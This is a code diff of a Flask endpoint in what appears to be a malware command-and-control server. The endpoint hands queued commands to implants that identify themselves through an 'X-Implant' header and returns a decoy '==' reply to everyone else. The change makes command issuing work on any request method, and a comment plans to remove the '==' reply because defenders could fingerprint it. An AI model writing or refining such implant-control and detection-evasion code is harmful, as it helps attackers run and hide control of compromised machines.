@@ -116,15 +116,13 @@ def stager():
 @app.route("/index", methods=["GET", "POST"])
 def implant_beacon_endpoint():
     if 'X-Implant' not in request.headers:
+        print("Warning: No implant header seen.")
         return "=="
-    if request.method == "POST":
-        next_cmd, command_id = Imp.issue_command(request.headers['X-Implant'], app.config['listener_type'])
-        if next_cmd is not None:
-            processed_return_val = preprocessing[next_cmd['type']](next_cmd, command_id)
-            print("Sending command to implant!\nCommand string: {}\ncommand_id: {}".format(
-                processed_return_val,
-                command_id))
-            return processed_return_val
+
+    next_cmd, command_id = Imp.issue_command(request.headers['X-Implant'], app.config['listener_type'])
+    if next_cmd is not None:
+        processed_return_val = preprocessing[next_cmd['type']](next_cmd, command_id)
+        return processed_return_val
     # Need to remove the use of == in beacons, this can be fingerprinted with ease.
     return "=="
 
